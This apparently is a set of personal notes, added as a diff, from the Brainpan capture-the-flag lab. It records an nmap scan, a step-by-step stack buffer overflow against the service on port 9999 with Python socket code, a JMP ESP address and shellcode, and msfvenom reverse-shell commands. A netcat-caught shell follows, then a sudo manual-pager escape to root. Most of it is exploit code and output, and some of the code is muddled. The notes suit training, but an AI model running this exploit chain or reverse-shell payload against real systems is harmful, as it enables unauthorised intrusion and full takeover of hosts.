@@ -1,0 +1,146 @@
+└─$ nmap -sSCV -p 9999,10000 192.168.56.117
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-06 11:06 EDT
+Nmap scan report for 192.168.56.117
+Host is up (0.00043s latency).
+
+PORT      STATE SERVICE VERSION
+9999/tcp  open  abyss?
+| fingerprint-strings: 
+|   NULL: 
+|     _| _| 
+|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
+|     _|_| _| _| _| _| _| _| _| _| _| _| _|
+|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
+|     [________________________ WELCOME TO BRAINPAN _________________________]
+|_    ENTER THE PASSWORD
+10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
+|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
+|_http-title: Site doesn't have a title (text/html).
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9999-TCP:V=7.94SVN%I=7%D=5/6%Time=681A2563%P=x86_64-pc-linux-gnu%r(
+SF:NULL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_
+SF:\|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x2
+SF:0\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|
+SF:\x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|
+SF:\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|
+SF:\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_
+SF:\|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20
+SF:\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20
+SF:\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20
+SF:\x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x2
+SF:0_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20
+SF:\x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN
+SF:\x20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER
+SF:\x20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\
+SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");
+MAC Address: 08:00:27:E5:0B:E5 (Oracle VirtualBox virtual NIC)
+
+//after dirsearch, got /bin
+//a .exe file get, so we tried buffer overflow
+
+//****buffer overflow steps -- use immunity debugger
+    //1. code to test how long a input strings will make the app crashed. in 100 byte level
+    //2. exactly the longth to EIP (4 bytes), the offset
+    //3. check how long strings the ESP can accept, we need almost 400-500 bytes.
+    //4. send the paylaod, offset + EIP(the address of ESP) + PAD ("\x90"*16) + shellcode(write to ESP)
+
+//code for setp1
+    buffer =["A"]
+    counter = 100
+
+    while len(buffer) <=30:
+        buffer.append("A"*counter)
+        counter += 100
+
+    for i in buffer:
+        buffer = "A"*524 + "\xf3\x12\x17\x31"+ pad + shell
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        connect = s.connect(('192.168.56.117',9999))
+        s.send(buffer)
+        data = s.recv(1024)
+        print(len(bufer), "Sent! ")
+        s.close()
+    //here the length is the value of offset
+//step 2 codes
+    //buffer > offset ,but < offset +100
+    //we tried to sent the length of buffer to get exactly offset, to make B to write on EIP addr
+    buffer ="A"*x + "B"*4
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    connect = s.connect(('192.168.56.117',9999))
+    s.send(buffer)
+    data = s.recv(1024)
+    s.close()
+
+//step3
+    //change buffer = "A"*offset + "B"*4 + "C"*500 (500bytes is enough for revershell )
+    //use same code as step2
+    // send the bad char strings to test badchar which is not accept by the target software, ohter than \x00
+    //the payload is "\x01 -- \xff"
+//step4
+    buffer = "A"*offset + (the address of ESP) + PAD + shellcode
+    //for ESP, we need to map the opcode(operation code) of JMP ESP, that is \xff\xe4.
+        //!mona modules (mona.py) -- to check the sofatware is protected or not,  if it is false, we can find the addr os EIP, by find \xff\xe4
+        //!mona find -s "\xff\xe4" -m brainpan.exe, we get a addr 311712f3, but the addr in the ram is "\xf3\x12\x17\x31"
+    //  reverse shellcode of bytes format,
+        //msfvenom -p windows/shell_reverse_tcp LHOST=xx LPORT=xx EXITFUNC=thread -f c -a x86 -b "\x00" (use to test on win host)
+        //msfvenom -p linux/x86/shell_reverse_tcp LHOST=xx LPORT=xx EXITFUNC=thread -f c -a x86 -b "\x00" (use on kali)
+
+
+└─$ nc -nvlp 8821
+listening on [any] 8821 ...
+connect to [192.168.56.108] from (UNKNOWN) [192.168.56.117] 57232
+id
+uid=1002(puck) gid=1002(puck) groups=1002(puck)
+
+sudo -l
+Matching Defaults entries for puck on this host:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User puck may run the following commands on this host:
+    (root) NOPASSWD: /home/anansi/bin/anansi_util
+puck@brainpan:/home/puck/web$ ls -la
+ls -la
+
+
+puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual id
+sudo /home/anansi/bin/anansi_util manual id
+No manual entry for manual
+WARNING: terminal is not fully functional
+-  (press RETURN)!/bin/bash
+!/bin/bash
+root@brainpan:/usr/share/man# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@brainpan:/usr/share/man# cd /root
+cd /root
+root@brainpan:~# ls
+ls
+b.txt
+root@brainpan:~# cat b.txt
+cat b.txt
+_|                            _|                                        
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
+_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+                                            _|                          
+                                            _|
+
+
+                                              http://www.techorganic.com 
+
